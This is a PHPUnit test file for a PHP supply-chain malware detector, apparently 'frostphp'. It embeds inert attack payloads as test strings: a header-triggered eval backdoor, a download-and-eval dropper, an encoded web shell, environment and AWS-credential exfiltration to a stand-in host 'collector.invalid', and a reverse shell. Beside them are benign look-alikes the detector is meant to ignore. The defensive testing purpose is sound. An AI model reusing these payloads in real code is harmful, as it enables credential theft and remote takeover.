<?php

declare(strict_types=1);

namespace Frost\Tests;

use PHPUnit\Framework\TestCase;

/**
 * The shapes of published attacks, reconstructed from their write-ups.
 *
 * Every payload here is inert and points at `.invalid` hosts, which can never
 * resolve. The point is not to run them; it is that the shapes stay caught
 * when the engine changes, and - just as much - that the benign look-alikes
 * beside them stay quiet, because a supply-chain check that fires on every
 * package's ordinary work is one nobody reads.
 */
final class SupplyChainTest extends TestCase
{
    use Helper;

    /**
     * php-src, March 2021: two commits pushed to git.php.net added a check for
     * a `User-Agentt` header and passed the rest of it to the evaluator.
     */
    public function testTheHeaderTriggeredBackdoor(): void
    {
        $code = $this->php(
            'if (strpos($_SERVER["HTTP_USER_AGENTT"], "zerodium") === 0) {'
            . ' eval(substr($_SERVER["HTTP_USER_AGENTT"], 8)); }'
        );
        self::assertContains('code injection', $this->kinds($code));
    }

    /** The classic dropper: fetch a stage two and run it. */
    public function testDownloadAndExecute(): void
    {
        $code = $this->php('eval(file_get_contents("http://collector.invalid/stage2"));');
        $capabilities = $this->capabilities($code);
        self::assertContains('codegen.eval', $capabilities);
        self::assertContains('network.url', $capabilities);
    }

    public function testTheEncodedWebShell(): void
    {
        $code = $this->php('@eval(gzinflate(base64_decode("H4sIAAAA")));');
        self::assertContains('obfuscated payload', $this->kinds($code));
    }

    public function testEnvironmentExfiltrationAtIncludeTime(): void
    {
        $code = $this->php('$c = curl_init("https://collector.invalid/x"); curl_setopt($c, CURLOPT_POSTFIELDS, $_ENV);');
        self::assertContains('exfiltration', $this->kinds($code));

        $uses = $this->uses($code);
        self::assertTrue($uses[0]->topLevel, 'this has already happened by the time anything is called');
    }

    public function testCredentialFileTheft(): void
    {
        $code = $this->php(
            '$k = file_get_contents($_SERVER["HOME"] . "/.aws/credentials");'
            . ' file_get_contents("https://collector.invalid/?k=" . $k);'
        );
        // The path is built from request-controllable state and the read is
        // followed by an outbound request: both halves are reported.
        $capabilities = $this->capabilities($code);
        self::assertContains('filesystem.read', $capabilities);
        self::assertContains('network.url', $capabilities);
    }

    public function testAReverseShell(): void
    {
        $code = $this->php('$s = fsockopen("10.0.0.1", 4444); $p = proc_open("/bin/sh -i", $d, $pipes);');
        $capabilities = $this->capabilities($code);
        self::assertContains('network.socket', $capabilities);
        self::assertContains('process.proc', $capabilities);
    }

    // ---- and the benign cases, which must never fire --------------------

    public function testAnOrdinaryApiClientIsNotExfiltration(): void
    {
        $code = $this->php(
            '$c = curl_init($url);'
            . ' curl_setopt($c, CURLOPT_HTTPHEADER, ["Authorization: Bearer " . getenv("API_TOKEN")]);'
            . ' curl_exec($c);'
        );
        self::assertSame([], $this->kinds($code), 'sending one named credential is how every client works');
    }

    public function testAFixedCommandIsACapabilityNotAFlow(): void
    {
        $code = $this->php('exec("/usr/bin/git rev-parse HEAD", $out);');
        self::assertSame([], $this->kinds($code));
        self::assertContains('process.exec', $this->capabilities($code));
    }

    public function testReadingConfigurationIsNotAnAttack(): void
    {
        $code = $this->php('$debug = getenv("APP_DEBUG"); ini_set("display_errors", $debug);');
        self::assertSame([], $this->kinds($code));
    }

    public function testATemplateEngineCachingCompiledCodeIsNotAWebShell(): void
    {
        $code = $this->php('file_put_contents($cache, $compiled); include $cache;');
        // A dynamic include is a real capability and is reported as one, but
        // there is no untrusted input here, so it is not a flow.
        self::assertSame([], $this->kinds($code));
        self::assertContains('include.dynamic', $this->capabilities($code));
    }

    /**
     * The floor, asserted rather than hand-waved.
     *
     * frostphp reads PHP source. A payload compiled into a native extension,
     * or sealed inside a phar's binary stub, is not source and no source-level
     * analysis will see it. This test exists so that the limit cannot quietly
     * move without someone noticing.
     */
    public function testWhatItCannotSee(): void
    {
        // The extension load is visible; what the extension then does is not.
        $code = $this->php('dl("evil.so");');
        self::assertContains('native.dl', $this->capabilities($code));
        self::assertSame([], $this->kinds($code), 'nothing in the .so is readable from here');

        // Likewise a phar: the capability is reported, the payload is opaque.
        $phar = $this->php('$p = new Phar("bundle.phar"); $p->extractTo("/tmp");');
        self::assertContains('deserialize.phar', $this->capabilities($phar));
    }
}
